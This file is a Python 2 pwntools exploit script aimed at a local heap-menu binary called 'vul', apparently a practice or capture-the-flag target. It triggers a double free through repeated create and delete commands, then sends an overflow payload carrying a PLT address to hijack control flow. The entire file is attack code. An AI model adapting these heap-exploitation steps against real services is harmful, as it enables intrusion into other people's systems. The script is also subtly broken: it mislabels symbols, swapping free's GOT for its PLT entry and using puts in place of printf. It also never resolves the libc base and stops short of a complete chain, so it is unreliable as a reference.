#!/usr/bin/env python
#coding:utf8
import socket
import time
from pwn import *

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('127.0.0.1',8000))

e = ELF('../vul')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

free_libc = libc.symbols['free']
system_libc = libc.symbols['system']
libc_adr = libc.address
free_got = e.plt['free']
printf_plt = e.plt['puts']
printf_got = e.got['printf']
print free_got
print libc_adr


def create_sc(sock,sc,lenth):
	print sock.recv(1024)
	sock.send('create')
	print 'create'
	print sock.recv(1024)
	sock.send(lenth)
	print lenth
	print sock.recv(1024)
	sock.send(sc)
	print sc

def delete_sc(sock,sc):
	print sock.recv(1024)
	sock.send('delete')
	print 'delete'
	print sock.recv(1024)
	sock.send(sc)
	print sc


def quit_sc(sock):
	print sock.recv(1024)
	sock.send('quit')
	print 'quit'

create_sc(sock,'aa','8')
create_sc(sock,'bb','8')
create_sc(sock,'cc','8')
delete_sc(sock,'0')
delete_sc(sock,'1')
delete_sc(sock,'0')

payload = 'a'*16 + 'b'*8  + p64(printf_plt)
create_sc(sock,payload,'32')
delete_sc(sock,'1')
quit_sc(sock)






